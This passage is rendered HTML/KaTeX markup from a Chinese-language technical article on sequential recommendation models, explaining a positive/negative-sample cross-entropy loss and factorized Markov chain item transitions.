class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\">t</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mspace nobreak\"></span><span class=\"mspace\" style=\"margin-right:0.1111111111111111em;\"></span><span class=\"mpunct\"></span><span class=\"mspace\" style=\"margin-right:-0.16666666666666666em;\"></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mrel\">:</span></span><span class=\"mspace\" style=\"margin-right:0.3333333333333333em;\"></span><span class=\"mord text\"><span class=\"mord\"> </span><span class=\"mord cjk_fallback\">在时间步</span><span class=\"mord\"> </span></span><span class=\"mord mathnormal\">t</span><span class=\"mord text\"><span class=\"mord\"> </span><span class=\"mord cjk_fallback\">预测物品</span><span class=\"mord\"> </span></span><span class=\"mord mathnormal\" style=\"margin-right:0.05724em;\">j</span><span class=\"mord text\"><span class=\"mord\"> </span><span class=\"mord cjk_fallback\">的相关性分数</span><span class=\"mord\">,</span></span><span class=\"mord mathnormal\" style=\"margin-right:0.05724em;\">j</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mord\"><span class=\"mrel\">∈</span></span><span class=\"mord vbox\"><span class=\"thinbox\"><span class=\"llap\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"inner\"><span class=\"mord\"><span class=\"mord\">/</span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span></span></span><span class=\"fix\"></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7143919999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">u</span></span></span></span></span></span></span></span><span class=\"mord text\"><span class=\"mord\"> </span><span class=\"mord cjk_fallback\">表示不在用户</span><span class=\"mord\"> </span></span><span class=\"mord mathnormal\">u</span><span class=\"mord text\"><span class=\"mord\"> </span><span class=\"mord cjk_fallback\">的历史</span></span></span></span><span style=\"top:0.5900000000000007em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord text\"><span class=\"mord cjk_fallback\">交互序列中的物品。</span></span></span></span><span style=\"top:2.0900000000000007em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">σ</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord cjk_fallback\">表</span><span class=\"mord cjk_fallback\">示</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">d</span><span class=\"mord cjk_fallback\">函</span><span class=\"mord cjk_fallback\">数</span><span class=\"mord cjk_fallback\">。</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.750000000000001em;\"><span></span></span></span></span></span></span></span></span></span></span></span></p>\n</li>\n</ul>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mtable rowspacing=\"0.24999999999999992em\" columnalign=\"right left\" columnspacing=\"0em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mi>log</mi><mo>⁡</mo><mo stretchy=\"false\">(</mo><mi>σ</mi><mo stretchy=\"false\">(</mo><msub><mi>r</mi><mrow><msub><mi>o</mi><mi>t</mi></msub><mo separator=\"true\">,</mo><mi>t</mi></mrow></msub><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">)</mo><mtext>:对于时间步 </mtext><mi>t</mi><mtext> 的正样本 </mtext><msub><mi>o</mi><mi>t</mi></msub><mtext>,计算预测相关性分数的对数。</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><munder><mo>∑</mo><mrow><mi>j</mi><mo mathvariant=\"normal\">∉</mo><msup><mi>S</mi><mi>n</mi></msup></mrow></munder><mi>log</mi><mo>⁡</mo><mo stretchy=\"false\">(</mo><mn>1</mn><mo>−</mo><mi>σ</mi><mo stretchy=\"false\">(</mo><msub><mi>r</mi><mrow><mi>j</mi><mo separator=\"true\">,</mo><mi>t</mi></mrow></msub><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">)</mo><mtext>:对于时间步 </mtext><mi>t</mi><mtext> 的负样本集合,计算每个负样本</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>的预测相关性分数的对数。</mtext></mrow></mstyle></mtd></mtr></mtable><annotation encoding=\"application/x-tex\">\\begin{aligned}&amp;\\log(\\sigma(r_{o_{t},t}))\\text{:对于时间步 }t\\text{ 的正样本 }o_t\\text{,计算预测相关性分数的对数。}\\\\&amp;\\sum_{j\\notin S^n}\\log(1-\\sigma(r_{j,t}))\\text{:对于时间步 }t\\text{ 的负样本集合,计算每个负样本}\\\\&amp;\\text{的预测相关性分数的对数。}\\end{aligned}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:5.866010000000002em;vertical-align:-2.6830050000000014em;\"></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:3.1830050000000005em;\"><span style=\"top:-5.39301em;\"><span class=\"pstrut\" style=\"height:3.050005em;\"></span><span class=\"mord\"></span></span><span style=\"top:-3.6830049999999996em;\"><span class=\"pstrut\" style=\"height:3.050005em;\"></span><span class=\"mord\"></span></span><span style=\"top:-1.0269999999999988em;\"><span class=\"pstrut\" style=\"height:3.050005em;\"></span><span class=\"mord\"></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.6830050000000014em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:3.1830050000000005em;\"><span style=\"top:-5.39301em;\"><span class=\"pstrut\" style=\"height:3.050005em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mop\">lo<span style=\"margin-right:0.01389em;\">g</span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">σ</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.28055599999999997em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">o</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.29634285714285713em;\"><span style=\"top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\">t</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mclose\">)</span><span class=\"mord text\"><span class=\"mord\">:</span><span class=\"mord cjk_fallback\">对于时间步</span><span class=\"mord\"> </span></span><span class=\"mord mathnormal\">t</span><span class=\"mord text\"><span class=\"mord\"> </span><span class=\"mord cjk_fallback\">的正样本</span><span class=\"mord\"> </span></span><span class=\"mord\"><span class=\"mord mathnormal\">o</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2805559999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord text\"><span class=\"mord\">,</span><span class=\"mord cjk_fallback\">计算预测相关性分数的对数。</span></span></span></span><span style=\"top:-3.6830049999999996em;\"><span class=\"pstrut\" style=\"height:3.050005em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.050005em;\"><span style=\"top:-1.808995em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"mrel mtight\"><span class=\"mord mtight\"><span class=\"mrel mtight\">∈</span></span><span class=\"mord vbox mtight\"><span class=\"thinbox mtight\"><span class=\"llap mtight\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"inner\"><span class=\"mord mtight\"><span class=\"mord mtight\">/</span><span class=\"mspace mtight\" style=\"margin-right:0.06505555555555556em;\"></span></span></span><span class=\"fix\"></span></span></span></span></span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.5935428571428571em;\"><span style=\"top:-2.786em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span></span></span></span></span></span></span></span></span><span style=\"top:-3.0500049999999996em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span><span class=\"mop op-symbol large-op\">∑</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.516005em;\"><span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mop\">lo<span style=\"margin-right:0.01389em;\">g</span></span><span class=\"mopen\">(</span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">σ</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\">t</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mclose\">)</span><span class=\"mord text\"><span class=\"mord\">:</span><span class=\"mord cjk_fallback\">对于时间步</span><span class=\"mord\"> </span></span><span class=\"mord mathnormal\">t</span><span class=\"mord text\"><span class=\"mord\"> </span><span class=\"mord cjk_fallback\">的负样本集合</span><span class=\"mord\">,</span><span class=\"mord cjk_fallback\">计算每个负样本</span></span></span></span><span style=\"top:-1.0269999999999988em;\"><span class=\"pstrut\" style=\"height:3.050005em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord text\"><span class=\"mord cjk_fallback\">的预测相关性分数的对数。</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.6830050000000014em;\"><span></span></span></span></span></span></span></span></span></span></span></span></p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mtable rowspacing=\"0.24999999999999992em\" columnalign=\"right left\" columnspacing=\"0em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>数</mtext><mo separator=\"true\">,</mo><mtext>从而提高正样本的预测概率。</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>负样本损失:通过</mtext><munder><mo>∑</mo><mrow><mi>j</mi><mo mathvariant=\"normal\">∉</mo><msup><mi>S</mi><mi>u</mi></msup></mrow></munder><mi>log</mi><mo>⁡</mo><mo stretchy=\"false\">(</mo><mn>1</mn><mo>−</mo><mi>σ</mi><mo stretchy=\"false\">(</mo><msub><mi>r</mi><mrow><mi>j</mi><mo separator=\"true\">,</mo><mi>t</mi></mrow></msub><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">)</mo><mtext>项,模型希望最小化负样本的预</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>测相关性分数,从而降低负样本的预测概率。</mtext></mrow></mstyle></mtd></mtr></mtable><annotation encoding=\"application/x-tex\">\\begin{aligned}\n&amp;数,从而提高正样本的预测概率。 \\\\\n&amp;\\text{负样本损失:通过}\\sum_{j\\notin S^{u}}\\log(1-\\sigma(r_{j,t})) \\text{项,模型希望最小化负样本的预} \\\\\n&amp;\\text{测相关性分数,从而降低负样本的预测概率。}\n\\end{aligned}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:5.866010000000002em;vertical-align:-2.6830050000000014em;\"></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:3.1830050000000005em;\"><span style=\"top:-5.39301em;\"><span class=\"pstrut\" style=\"height:3.050005em;\"></span><span class=\"mord\"></span></span><span style=\"top:-3.6830049999999996em;\"><span class=\"pstrut\" style=\"height:3.050005em;\"></span><span class=\"mord\"></span></span><span style=\"top:-1.0269999999999988em;\"><span class=\"pstrut\" style=\"height:3.050005em;\"></span><span class=\"mord\"></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.6830050000000014em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:3.1830050000000005em;\"><span style=\"top:-5.39301em;\"><span class=\"pstrut\" style=\"height:3.050005em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord cjk_fallback\">数</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord cjk_fallback\">从</span><span class=\"mord cjk_fallback\">而</span><span class=\"mord cjk_fallback\">提</span><span class=\"mord cjk_fallback\">高</span><span class=\"mord cjk_fallback\">正</span><span class=\"mord cjk_fallback\">样</span><span class=\"mord cjk_fallback\">本</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">预</span><span class=\"mord cjk_fallback\">测</span><span class=\"mord cjk_fallback\">概</span><span class=\"mord cjk_fallback\">率</span><span class=\"mord cjk_fallback\">。</span></span></span><span style=\"top:-3.6830049999999996em;\"><span class=\"pstrut\" style=\"height:3.050005em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord text\"><span class=\"mord cjk_fallback\">负样本损失</span><span class=\"mord\">:</span><span class=\"mord cjk_fallback\">通过</span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.050005em;\"><span style=\"top:-1.808995em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"mrel mtight\"><span class=\"mord mtight\"><span class=\"mrel mtight\">∈</span></span><span class=\"mord vbox mtight\"><span class=\"thinbox mtight\"><span class=\"llap mtight\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"inner\"><span class=\"mord mtight\"><span class=\"mord mtight\">/</span><span class=\"mspace mtight\" style=\"margin-right:0.06505555555555556em;\"></span></span></span><span class=\"fix\"></span></span></span></span></span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.5935428571428571em;\"><span style=\"top:-2.786em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">u</span></span></span></span></span></span></span></span></span></span></span></span><span style=\"top:-3.0500049999999996em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span><span class=\"mop op-symbol large-op\">∑</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.516005em;\"><span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mop\">lo<span style=\"margin-right:0.01389em;\">g</span></span><span class=\"mopen\">(</span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">σ</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\">t</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mclose\">)</span><span class=\"mord text\"><span class=\"mord cjk_fallback\">项</span><span class=\"mord\">,</span><span class=\"mord cjk_fallback\">模型希望最小化负样本的预</span></span></span></span><span style=\"top:-1.0269999999999988em;\"><span class=\"pstrut\" style=\"height:3.050005em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord text\"><span class=\"mord cjk_fallback\">测相关性分数</span><span class=\"mord\">,</span><span class=\"mord cjk_fallback\">从而降低负样本的预测概率。</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.6830050000000014em;\"><span></span></span></span></span></span></span></span></span></span></span></span></p>\n<h3 id=\"讨论\"><a class=\"anchor\" href=\"#讨论\">#</a> 讨论</h3>\n<ul>\n<li>\n<p>因式分解马尔科夫链可得到：FMC 会对一阶项目转移矩阵进行因式分解，并根据上一项目<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>i</mi></mrow><annotation encoding=\"application/x-tex\">i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.65952em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">i</span></span></span></span> 预测下一个项目<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>j</mi></mrow><annotation encoding=\"application/x-tex\">j</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.85396em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05724em;\">j</span></span></span></span>：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>P</mi><mo stretchy=\"false\">(</mo><mi>j</mi><mi mathvariant=\"normal\">∣</mi><mi>i</mi><mo stretchy=\"false\">)</mo><mo>∝</mo><msubsup><mi mathvariant=\"bold\">M</mi><mi>i</mi><mi>T</mi></msubsup><msub><mi mathvariant=\"bold\">N</mi><mi>j</mi></msub></mrow><annotation encoding=\"application/x-tex\">P(j|i)\\propto\\mathbf{M}_i^T\\mathbf{N}_j\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.05724em;\">j</span><span class=\"mord\">∣</span><span class=\"mord mathnormal\">i</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∝</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.177439em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">M</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8913309999999999em;\"><span style=\"top:-2.4530000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.247em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">N</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span></span></p>\n<ul>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>P</mi><mo stretchy=\"false\">(</mo><mi>j</mi><mi mathvariant=\"normal\">∣</mi><mi>i</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">P(j|i)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.05724em;\">j</span><span class=\"mord\">∣</span><span class=\"mord mathnormal\">i</span><span class=\"mclose\">)</span></span></span></span> 表示在给定物品<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>i</mi></mrow><annotation encoding=\"application/x-tex\">i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.65952em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">i</span></span></span></span> 的情况下，推荐物品<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>j</mi></mrow><annotation encoding=\"application/x-tex\">j</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.85396em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05724em;\">j</span></span></span></span> 的概率</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>M</mi><mi>i</mi></msub></mrow><annotation encoding=\"application/x-tex\">M_i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 表示物品<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>i</mi></mrow><annotation encoding=\"application/x-tex\">i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.65952em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">i</span></span></span></span> 的嵌入向量</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>N</mi><mi>j</mi></msub></mrow><annotation encoding=\"application/x-tex\">N_j</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.969438em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">N</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span> 表示物品<span 